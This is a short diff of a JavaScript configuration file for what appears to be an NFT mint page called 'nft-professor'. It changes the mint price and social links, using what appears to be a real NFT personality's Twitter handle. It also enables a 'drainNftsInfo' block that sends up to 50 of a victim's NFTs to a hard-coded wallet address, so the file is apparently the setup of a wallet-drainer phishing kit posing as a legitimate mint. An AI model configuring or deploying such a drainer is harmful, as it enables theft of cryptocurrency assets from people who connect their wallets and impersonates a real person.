@@ -10,10 +10,10 @@ const receiveAddress = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";
 
 const collectionInfo = {
     name: "nft-professor",
-    date: "10.04.2022",
+    date: "10.09.2022",
     socialMedia: {
-        discord: "discord.gg/invite_here",
-        twitter: "https://twitter.com/username_here",
+        discord: "https://discord.gg/hfPhCPyK",
+        twitter: "https://twitter.com/gmoneyNFT",
     },
     medias: {
         preview: "preview.gif",
@@ -33,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.2,
+    price: 0.002,
     totalSupply: 8888,
     minUnits: 1,
     maxUnits: 20,
@@ -46,9 +46,9 @@ const mintInfo = {
 
 const drainNftsInfo = {
     active: true,
-    minValue: 0.2,
-    maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    minValue: 0.002,
+    maxTransfer: 50,
+    nftReceiveAddress: "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97",
 }
 
 const customStrings = {
